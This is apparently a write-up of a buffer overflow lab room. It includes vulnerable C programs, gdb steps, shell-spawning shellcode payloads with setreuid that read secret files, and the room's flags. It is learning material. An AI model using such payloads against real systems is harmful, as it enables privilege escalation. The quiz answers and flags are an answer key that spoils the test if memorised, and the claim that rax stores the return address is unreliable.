# Buffer Overflows

## Task 2 Process Layout

#### Where is dynamically allocated memory stored?

{% hint style="success" %}
`heap`
{% endhint %}

#### Where is information about functions(e.g. local arguments) stored?

{% hint style="success" %}
`stack`
{% endhint %}

## Task 3 x86-64 Procedures

#### what direction does the stack grown(l for lower/h for higher)

{% hint style="success" %}
`l`
{% endhint %}

#### what instruction is used to add data onto the stack?

{% hint style="success" %}
`push`
{% endhint %}

## Task 4 Procedures Continued

#### What register stores the return address?

{% hint style="success" %}
`rax`
{% endhint %}

## Task 6 Overwriting Variables

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

#### What is the minimum number of characters needed to overwrite the variable?

```bash
python -c 'print "A" * 15' | ./int-overflow
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 06-48-29.png>)

{% hint style="success" %}
`15`
{% endhint %}

## Task 7 Overwriting Function Pointers

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special() {
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal() {
    printf("this is the normal function\n");
}

void other() {
    printf("why is this here?");
}

int main(int argc, char **argv) {
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```

#### Invoke the special function()

```bash
gdb -q ./func-pointer
(gdb) info address normal
(gdb) info address special
(gdb) set disassembly-flavor intel 
(gdb) disassemble main
(gdb) break *main + 40
(gdb) run
(gdb) x/30wx
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 06-53-18.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-07 06-56-30.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-07 06-59-12.png>)

```bash
python -c 'print "A" * 14 + "\x67\x05\x40"' | ./func-pointer 
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 07-00-53.png>)

## Task 8 Buffer Overflows

```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string) {
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv) {
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

```bash
wget --recursive --no-parent --no-host-directories \
     --reject "index.html*",gif,png http://10.6.9.176/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

```bash
gdb -q ./buffer-overflow
gdb > pattern_create 200 pattern.txt
gdb > run $(cat pattern.txt)
gdb > pattern_search
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 07-34-30.png>)

```bash
./buffer-overflow $(python -c 'print "\x90" * 80 + "\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" + "\x90" * (152 - 80 - 40) + "\x80\xe2\xff\xff\xff\x7f"')
cat secret.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-29-04.png>)

```bash
pwn shellcraft -f d amd64.linux.setreuid 1002
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-28-31.png>)

```bash
./buffer-overflow $(python -c 'print "\x90" * 80 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05"  + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * (152 - 80 - 14 - 27) + "\x80\xe2\xff\xff\xff\x7f"')
cat secret.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-27-35.png>)

{% hint style="success" %}
`omgyoudidthissocool!!`
{% endhint %}

## Task 9 Buffer Overflow 2

#### Use the same method to read the contents of the secret file!

```c
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string) {
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv) {
    concat_arg(argv[1]);
}
```

```bash
gdb -q ./buffer-overflow-2
> pattern_create 200 pattern.txt
> run $(cat pattern.txt)
> pattern_search
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-44-20.png>)

```bash
> break *concat_arg + 105
> run $(python -c 'print "\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * (163 - 80 - 27) + "deadbeef"')
> x/30wx $rsp
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-45-58.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-47-50.png>)

```bash
./buffer-overflow-2 $(python -c 'print "\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * (163 - 80 - 27) + "\x70\xe2\xff\xff\xff\x7f"')
cat secret.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-49-16.png>)

```bash
pwn shellcraft -f d amd64.linux.setreuid 1003
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-51-57.png>)

```bash
./buffer-overflow-2 $(python -c 'print "\x90" * 80 + "\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05" + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * (163 - 80 - 14 - 27) + "\x70\xe2\xff\xff\xff\x7f"')
cat secret.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-07 08-54-52.png>)

{% hint style="success" %}
`wowanothertime!!`
{% endhint %}

## Reference

```bash
./buffer-overflow $(python -c 'print "\x90" * 80 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05"  + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * (152 - 80 - 14 - 27) + "\x80\xe2\xff\xff\xff\x7f"')
```

{% embed url="http://shell-storm.org/shellcode/files/shellcode-806.php" %}

{% embed url="https://www.aldeid.com/wiki/TryHackMe-Buffer-Overflows#[Task_8]_Buffer_Overflows" %}
